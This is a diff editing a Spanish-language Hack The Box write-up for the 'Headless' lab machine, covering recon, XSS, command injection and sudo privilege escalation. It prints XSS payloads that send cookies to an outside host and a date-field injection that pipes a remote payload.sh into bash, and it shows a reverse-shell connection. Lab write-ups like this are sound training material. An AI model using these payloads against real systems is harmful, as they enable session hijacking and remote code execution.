@@ -27,7 +27,8 @@ tags:
 
 ```terminal
 /home/kali/Documents/htb/machines/headless:-$ echo '10.10.11.8\theadless.htb' | sudo tee -a /etc/hosts
-
+```
+```terminal
 /home/kali/Documents/htb/machines/headless:-$ gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirb/big.txt
 /dashboard (Status: 500) [Size:  265]
 /support   (Status: 200) [Size: 2363]
@@ -49,13 +50,17 @@ Para explotar esta vulnerabilidad, intercepto una petición 'POST' del formulari
 ```
 El ataque XSS tiene dos partes principales.
 
-Inyección de un script en el encabezado 'User-Agent' para robar cookies.
+* Inyección de un script en el encabezado 'User-Agent' para robar cookies.
 
-	User-Agent: <script>var i=new Image(); i.src="http://10.10.16.59:8003/?cookie="+btoa(document.cookie);</script>
+```
+User-Agent: <script>var i=new Image(); i.src="http://10.10.16.59:8003/?cookie="+btoa(document.cookie);</script>
+```
 
-Inyección del mismo script en un campo de formulario 'Contact Support' para robar cookies cuando se visualiza el contenido del mensaje.
+* Inyección del mismo script en un campo de formulario 'Contact Support' para robar cookies cuando se visualiza el contenido del mensaje.
 
-	fname=ad&lname=min&email=ad%http://40min.com/&phone=%2B55-555+5555&message=<script>var i=new Image(); i.src="http://10.10.16.59:8003/?cookie="+btoa(document.cookie);</script>
+```
+fname=ad&lname=min&email=ad%http://40min.com/&phone=%2B55-555+5555&message=<script>var i=new Image(); i.src="http://10.10.16.59:8003/?cookie="+btoa(document.cookie);</script>
+```
 
 ![](/assets/img/htb-writeup-headless/headless5.png)
 
@@ -98,7 +103,6 @@ date=2023-09-15;curl http://10.10.16.59:8001/payload.sh%7Cbash > Send
 
  	...connect to [10.10.16.59] from (UNKNOWN) [10.10.11.8] 39442 
 
-dvir@headless:~/app$ cd
 dvir@headless:~$ cat user.txt 
 ```
 
@@ -107,9 +111,17 @@ dvir@headless:~$ cat user.txt
 
 El usuiario 'dvir' puede ejecutar el comnado '/usr/bin/syscheck' como 'sudo'.
 
+```terminal
+dvir@headless:~$ sudo -l
+```
+
 ![](/assets/img/htb-writeup-headless/headless9.png)
 
 El comando '/usr/bin/syscheck' ejecuta el archivo 'initdb.sh'. Por tanto, puedo agregar un payload dentro del archivo 'initdb.sh'.
+
+```terminal
+dvir@headless:~$ cat /usr/bin/syscheck
+```
 
 ![](/assets/img/htb-writeup-headless/headless10.png)
 
@@ -124,3 +136,6 @@ dvir@headless:~$ sudo /usr/bin/syscheck
 ```
 
 ![](/assets/img/htb-writeup-headless/headless11.png)
+
+> <https://www.hackthebox.com/achievement/machine/1521382/594>
+{: .prompt-tip }
